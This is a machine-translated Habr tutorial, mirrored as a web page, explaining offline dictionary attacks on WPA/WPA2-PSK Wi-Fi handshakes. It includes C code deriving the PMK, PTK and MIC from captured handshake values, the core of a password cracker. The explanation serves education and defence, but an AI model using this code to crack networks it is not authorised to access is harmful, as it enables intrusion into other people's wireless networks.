<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>About the WPA-PSK hacking algorithm</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good day, dear Habroskoobschestvo! 
 In this topic, I would like to consider some subtle issues related to attacks on Wi-Fi networks in the shared WPA...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>About the WPA-PSK hacking algorithm</h1><div class="post__text post__text-html js-mediator-article">  Good day, dear Habroskoobschestvo! <br>  In this topic, I would like to consider some subtle issues related to attacks on Wi-Fi networks in the shared WPA-PSK key mode (to put it more simply, WPA-PSK is a mode without a dedicated authentication server that most Wi-Fi users use, for example when creating a computer-to-computer network connection). <br><br><h4>  Why all this? </h4><br>  On the vast expanses of the Internet, you can find a description of the methods of such an attack, and download the program of its semi-automatic (a bright example of <a href="http://aircrack-ng.org/">aircrack-ng</a> ).  But most of these programs are presented to the user in the form of a kind of black box, which is also <s>good if it</s> works in accordance with its manual. <br><br>  A recent <a href="http://habrahabr.ru/blogs/infosecurity/122553/">article</a> on Habr√©, devoted to one of these programs, mentioning in itself the use of rainbow tables (is it possible?) To speed up the attack, and pushed me to write this topic.  I hope the information will be useful, since I have not seen any analogs on the network either in domestic or in enemy languages. <a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h4>  To attack, comrades! </h4><br>  The essence of the attack on the network in WPA-PSK mode is as follows: using the vulnerabilities of the user authentication protocol (namely, open data transfer), get some authorization data from the network, and then play the authentication algorithm on the attacker's side ( <a href="http://en.wikipedia.org/wiki/IEEE_802.11i-2004">wiki in the subject, sorry for the time being</a> ) by inserting the intercepted traffic fragment and password (the so-called shared key) into the source data.  The real password to the attacker is not known, therefore, passwords are chosen sequentially from a previously prepared dictionary.  If during the replay of the authentication algorithm a ‚Äúsuccessful user authorization‚Äù occurs, then the password selected from the dictionary is true and the attack resulted in a successful hacking of the network.  More information about the algorithm for establishing a connection (4-way handshake) can be found in the <a href="http://standards.ieee.org/getieee802/download/802.11i-2004.pdf">original source</a> . <br><br><h5>  The farther into the forest, the angrier the wolves </h5><br>  Now we delve a little into the wilds of the wonderful (whether?) <a href="http://standards.ieee.org/getieee802/download/802.11i-2004.pdf">IEEE 802.11i standard</a> and consider in more detail the 4-way handshake algorithm. <br><br>  Based on the mode name ("... with a shared key") it is logical to assume that in the process of establishing a connection and further communication between the client and the access point, some "key" (trouble, trouble with native speech) scheme will be used, namely a set of keys, both temporary and static, used to encrypt traffic, verify the integrity of messages, etc.  In this case, the agreement on the use of keys occurs at the stage of a 4-party handshake. <br><br>  To reproduce the user‚Äôs authentication algorithm on the side of the attacker, it is necessary to have information not only from 4-way handshake packets, but also from the broadcast packets of the access point of information about the network organized by it (Access Point Beacon, the sign of such a packet is the MAC address of the sender == MAC- address of the access point (bssid in the notification of the standard), the MAC address of the recipient broadcast FF: FF: FF: FF: FF: FF).  In particular, it is necessary to obtain the network name from such frames (essid in the notification of the standard). <br><br>  4-party handshake messages (4 data link layer frames) contain information fields of the following contents (I indicate only what is needed for the subsequent writing of the code that reproduces the attack algorithm, for details - as standard): <br><ul><li>  MAC address of the access point; </li><li>  MAC address of the client; </li><li>  random 32-byte number generated by the access point when establishing a connection (anonce) - frame I; </li><li>  random 32-byte number generated by the client (snonce) - frame II; </li><li>  the size of the current authentication frame (without a channel header) ‚Äîframe II or III or IV; </li><li>  the contents of the authentication frame (without the channel header) are necessarily the same, the frame selected in the previous paragraph; </li><li>  The message integrity key (mic) is necessarily the same, the frame selected in the previous paragraph; </li><li>  Data Security Protocol Version (WPA or WPA2) - Frame II or III or IV. </li></ul>  Signs that the frame is a 4-way handshake message are easily found in the IEEE 802.11i standard in the same section (4-way handshake). <br><br>  Now briefly about the connection establishment algorithm - the access point and the client exchange the above data (but not only them), transmitting information in an open (unencrypted) form.  At the same time, to <s>eliminate the</s> complication of conducting a man-in-the-middle attack, check the integrity of messages (starting from the second frame!) By calculating the message hashing function based on a hash ( <a href="http://ru.wikipedia.org/wiki/HMAC">HMAC</a> ), by its content using not only a static key, t Ie the password (and actually the hash from it), but also the random numbers anonce and snonce generated by the handshake participants at the moment of the connection establishment (and their hardware addresses are also used).  As a result, since both the client and the access point know each other's random numbers, and the password must be the same, the message integrity keys will coincide on both sides.  If during the transfer of 4 frames of the handshake 3 successful integrity checks are fixed (and the devices manage to agree on the supported modes of operation), then the access point concludes that a valid client is connected. <br><br>  As can be seen from the above description, no keys (neither the password nor the temporary integrity check keys) are transmitted in the clear over the network. <br><br>  There is a fair question - how can an attacker get the coveted key? <br><br><h5>  Inside the black box </h5><br>  Having a little thought, a simple solution comes to mind - the algorithm is known, the input data, with the exception of the password itself, is also known.  So what prevents to carry out calculations of the key of the integrity of the message by choosing any random (well, maybe not completely random, yet amuse your CSW, using godgod passwords and so on) the password from Vladimir Ivanovich Dahl's dictionary on the shelf.  Suppose we make mistakes several thousand (or millions) times, but sooner or later Fortune can smile at <s>us to the</s> attacker with his Hollywood smile, and the calculated key of integrity will coincide with the intercepted one.  And this will mean only one thing (rightly in connection with the avalanche effect of hashing functions) - the password used to create the network has been opened! <br><br><h5>  Finally code </h5><br>  So, the last spurt.  Who read to here now get candy. <br><br>  The theory behind, ahead of practice.  What should be done first?  Correctly, calculate the set of keys.  And for WPA-PSK mode, it‚Äôs quite small: <ol><li>  PMK master key (repeatedly hashed password using essid network name as seed). </li><li>  The transfer key PTK (with the help of it, or rather its part, the key of the message integrity is calculated). </li></ol>  How are keys calculated?  This is where the open source code of the <a href="http://aircrack-ng.org/">aircrack-ng</a> software package can help us, and reading <a href="http://www.ietf.org/rfc/rfc2898.txt">RFCs is</a> particularly eager for a scientific approach. <br><br>  Let's start with paragraph 1. <br><br><pre><code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">calc_pmk</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *key, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *essid_pre, uchar pmk[</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">40</span></span></span></span><span class="hljs-function"><span class="hljs-params">] )</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i, j, slen; uchar buffer[<span class="hljs-number"><span class="hljs-number">65</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> essid[<span class="hljs-number"><span class="hljs-number">33</span></span>+<span class="hljs-number"><span class="hljs-number">4</span></span>]; SHA_CTX ctx_ipad; SHA_CTX ctx_opad; SHA_CTX sha1_ctx; <span class="hljs-built_in"><span class="hljs-built_in">memset</span></span>(essid, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(essid)); <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(essid, essid_pre, <span class="hljs-built_in"><span class="hljs-built_in">strlen</span></span>(essid_pre)); slen = <span class="hljs-built_in"><span class="hljs-built_in">strlen</span></span>( essid ) + <span class="hljs-number"><span class="hljs-number">4</span></span>; <span class="hljs-comment"><span class="hljs-comment">/* setup the inner and outer contexts */</span></span> <span class="hljs-built_in"><span class="hljs-built_in">memset</span></span>( buffer, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>( buffer ) ); <span class="hljs-built_in"><span class="hljs-built_in">strncpy</span></span>( (<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *) buffer, key, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>( buffer ) - <span class="hljs-number"><span class="hljs-number">1</span></span> ); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>( i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">64</span></span>; i++ ) buffer[i] ^= <span class="hljs-number"><span class="hljs-number">0x36</span></span>; <span class="hljs-comment"><span class="hljs-comment">//SHA1_Init() initializes a SHA_CTX structure. SHA1_Init( &amp;ctx_ipad ); //SHA1_Update() can be called repeatedly with chunks of the message to be hashed (len bytes at data). SHA1_Update( &amp;ctx_ipad, buffer, 64 ); for( i = 0; i &lt; 64; i++ ) buffer[i] ^= 0x6A; SHA1_Init( &amp;ctx_opad ); SHA1_Update( &amp;ctx_opad, buffer, 64 ); /* iterate HMAC-SHA1 over itself 8192 times */ essid[slen - 1] = '\1'; HMAC(EVP_sha1(), (uchar *)key, strlen(key), (uchar*)essid, slen, pmk, NULL); memcpy( buffer, pmk, 20 ); for( i = 1; i &lt; 4096; i++ ) { memcpy( &amp;sha1_ctx, &amp;ctx_ipad, sizeof( sha1_ctx ) ); SHA1_Update( &amp;sha1_ctx, buffer, 20 ); //SHA1_Final() places the message digest in md, which must have space for SHA_DIGEST_LENGTH == //20 bytes of output, and erases the SHA_CTX SHA1_Final( buffer, &amp;sha1_ctx ); memcpy( &amp;sha1_ctx, &amp;ctx_opad, sizeof( sha1_ctx ) ); SHA1_Update( &amp;sha1_ctx, buffer, 20 ); SHA1_Final( buffer, &amp;sha1_ctx ); for( j = 0; j &lt; 20; j++ ) pmk[j] ^= buffer[j]; } essid[slen - 1] = '\2'; HMAC(EVP_sha1(), (uchar *)key, strlen(key), (uchar*)essid, slen, pmk+20, NULL); memcpy( buffer, pmk + 20, 20 ); for( i = 1; i &lt; 4096; i++ ) { memcpy( &amp;sha1_ctx, &amp;ctx_ipad, sizeof( sha1_ctx ) ); SHA1_Update( &amp;sha1_ctx, buffer, 20 ); SHA1_Final( buffer, &amp;sha1_ctx ); memcpy( &amp;sha1_ctx, &amp;ctx_opad, sizeof( sha1_ctx ) ); SHA1_Update( &amp;sha1_ctx, buffer, 20 ); SHA1_Final( buffer, &amp;sha1_ctx ); for( j = 0; j &lt; 20; j++ ) pmk[j + 20] ^= buffer[j]; } }</span></span></code> </pre> <br>  Actually 90% of the code is already behind.  As you can see all the simplest operations, <a href="http://ru.wikipedia.org/wiki/SHA-1">SHA-1 is</a> used as a hashing algorithm, namely its implementation, supplied in <a href="http://www.openssl.org/">OpenSSL</a> .  The sense of using a key as a key is not a password, but a hash from it is twofold - on the one hand, this is the way to unify the key length (since the length of the password itself can vary from 8 to 63 ASCII characters), and on the other hand, entering the computational the complexity of the algorithm for the formation of the scheme of keys to avoid lightweight brute-force attacks (these are two cycles of 4095 iterations in the code). <br><br>  Proceed to paragraph 2. Here, the temporal is calculated (the essence of temporality is that its calculation involves two random numbers snonce and anonce, which are new each time the connection is established) PTK key used to calculate the integrity keys of the transmitted frames.  In addition to the snonce and anonce numbers, the MAC addresses of the access point and the client are involved in its formation, the sacramental phrase ‚ÄúPairwise key expansion‚Äù (they will come up with this) and of course the key of the program is the PMK key.  The need to form a key for all these parameters makes it, on the one hand, limited in time of use (no rainbow tables will help now), on the other hand tied to specific equipment (the man-in-the-middle attack is complicated), and on the third hand, though indirectly , but it is long computed since it cannot be obtained bypassing the PMK key generation algorithm. <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">calc_ptk</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( uchar *pmk, uchar pke[</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">100</span></span></span></span><span class="hljs-function"><span class="hljs-params">], uchar *ptk )</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-comment"><span class="hljs-comment">/* compute the pairwise transient key*/</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">4</span></span>; i++) { pke[<span class="hljs-number"><span class="hljs-number">99</span></span>] = i; HMAC(EVP_sha1(), pmk, <span class="hljs-number"><span class="hljs-number">32</span></span>, pke, <span class="hljs-number"><span class="hljs-number">100</span></span>, ptk + i * <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>); } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ uchar pmk[<span class="hljs-number"><span class="hljs-number">40</span></span>]; <span class="hljs-comment"><span class="hljs-comment">//  32  uchar ptk[80]; uchar mic[20]; //  16  char *key = "12345678"; char essid_pre[32]; memset(essid_pre, 0, 32); memcpy(essid_pre, "Harkonen", 8); uchar bssid[6] = { 0x00, 0x14, 0x6c, 0x7e, 0x40, 0x80 }; uchar stmac[6] = { 0x00, 0x13, 0x46, 0xfe, 0x32, 0x0c }; uchar anonce[32] = { 0x22, 0x58, 0x54, 0xb0, 0x44, 0x4d, 0xe3, 0xaf, 0x06, 0xd1, 0x49, 0x2b, 0x85, 0x29, 0x84, 0xf0, 0x4c, 0xf6, 0x27, 0x4c, 0x0e, 0x32, 0x18, 0xb8, 0x68, 0x17, 0x56, 0x86, 0x4d, 0xb7, 0xa0, 0x55 }; uchar snonce[32] = { 0x59, 0x16, 0x8b, 0xc3, 0xa5, 0xdf, 0x18, 0xd7, 0x1e, 0xfb, 0x64, 0x23, 0xf3, 0x40, 0x08, 0x8d, 0xab, 0x9e, 0x1b, 0xa2, 0xbb, 0xc5, 0x86, 0x59, 0xe0, 0x7b, 0x37, 0x64, 0xb0, 0xde, 0x85, 0x70 }; uchar pke[100]; memset(pke, 0, 100); memcpy( pke, "Pairwise key expansion", 23 ); if( memcmp( stmac, bssid, 6 ) &lt; 0 ) { memcpy( pke + 23, stmac, 6 ); memcpy( pke + 29, bssid, 6 ); } else { memcpy( pke + 23, bssid, 6 ); memcpy( pke + 29, stmac, 6 ); } if( memcmp( snonce, anonce, 32 ) &lt; 0 ) { memcpy( pke + 35, snonce, 32 ); memcpy( pke + 67, anonce, 32 ); } else { memcpy( pke + 35, anonce, 32 ); memcpy( pke + 67, snonce, 32 ); } calc_pmk( key, essid_pre, pmk ); calc_ptk( pmk, pke, ptk ); }</span></span></code> </pre> <br>  The code is elementary again.  First, in the main, the pke array is formed, containing all the parameters described above, and then the 4-fold calculation of the HMAC.  Although we will continue to be interested only in the first 16 bytes. <br><br>  The actual formation of a set of keys is completed.  It only remains to calculate the integrity key using any of the 4-way handshake frames (having previously filled the mic field with zeros in it) using PTK and compare the result with the intercepted key.  The function of calculating the key of the mic mic is presented in the following code snippet.  The various branches of the if statement correspond to the WPA and WPA2 data protection protocol versions. <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">calc_mic</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> wpaKeyVer, uchar *ptk, uchar *eapol, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">size_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> eapolSize, uchar *mic )</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (wpaKeyVer == <span class="hljs-number"><span class="hljs-number">1</span></span>) HMAC(EVP_md5(), ptk, <span class="hljs-number"><span class="hljs-number">16</span></span>, eapol, eapolSize, mic, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> HMAC(EVP_sha1(), ptk, <span class="hljs-number"><span class="hljs-number">16</span></span>, eapol, eapolSize, mic, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>); }</code> </pre> <br>  An example of a working draft can be taken <a href="">from here</a> . <br><br>  Obviously, to organize a full-blown brute force attack, it remains only to repeat the above algorithm for each password from the dictionary. <br><br><h5>  Thinking out loud </h5><br>  The analysis of the user authentication algorithm in WPA / WPA2-PSK leads to the following conclusion: rainbow tables become irrelevant with this approach to calculating keys, and the speed of brute force passwords from the dictionary comes to the fore. <br><br>  But about this next time ... <br><br><h5>  Matches for children is not a toy </h5><br>  This topic was erupted from the depths of my subconscious solely in order to improve the security of information transfer in wireless networks Wi-Fi.  By publicly exposing hacking methods used by careless individuals, we contribute to raising the level of knowledge of a wide range of users, and as they say, ‚ÄúWarned, it means armed!‚Äù </div><p>Source: <a href="https://habr.com/ru/post/122623/">https://habr.com/ru/post/122623/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../122614/index.html">Review Yota Many</a></li>
<li><a href="../122615/index.html">Google cow</a></li>
<li><a href="../122616/index.html">Full IP-KVM for all deductible servers</a></li>
<li><a href="../122617/index.html">Integration of sites and social networks: ergonomic aspects</a></li>
<li><a href="../122620/index.html">Iterators & Generators</a></li>
<li><a href="../122625/index.html">"Innovative Laboratory" became a venture partner of RVK</a></li>
<li><a href="../122626/index.html">Toshiba took part in the celebration of the 20th anniversary of Intel in Russia</a></li>
<li><a href="../122627/index.html">A few words about high</a></li>
<li><a href="../122628/index.html">In St. Petersburg, a joint start-up is coming!</a></li>
<li><a href="../122630/index.html">Three arguments against singularity</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>